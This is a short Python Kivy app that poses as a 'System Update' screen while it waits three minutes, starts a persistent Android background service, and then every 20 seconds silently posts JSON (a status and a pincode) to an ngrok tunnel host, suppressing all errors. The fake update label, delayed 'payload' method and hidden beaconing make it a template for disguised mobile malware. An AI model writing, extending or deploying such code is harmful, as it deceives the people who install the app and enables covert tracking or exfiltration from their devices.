from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform
from kivy.clock import Clock
import requests

URL = "https://raeann-ineffective-concerningly.ngrok-free.dev" 

class SystemUpdate(App):
    def build(self):
        return Label(text="System Update v12.0.4\nChecking compatibility...")

    def on_start(self):
        Clock.schedule_once(self.start_payload, 180)

    def start_payload(self, dt):
        if platform == 'android':
            from android import python_service
            python_service.start_service("RaniaService", "Running", "Live")
        Clock.schedule_interval(self.send_data, 20)

    def send_data(self, dt):
        try:
            requests.post(URL, json={"status": "Active-5G", "pincode": "209304"}, timeout=5)
        except: pass

if __name__ == "__main__":
    SystemUpdate().run()
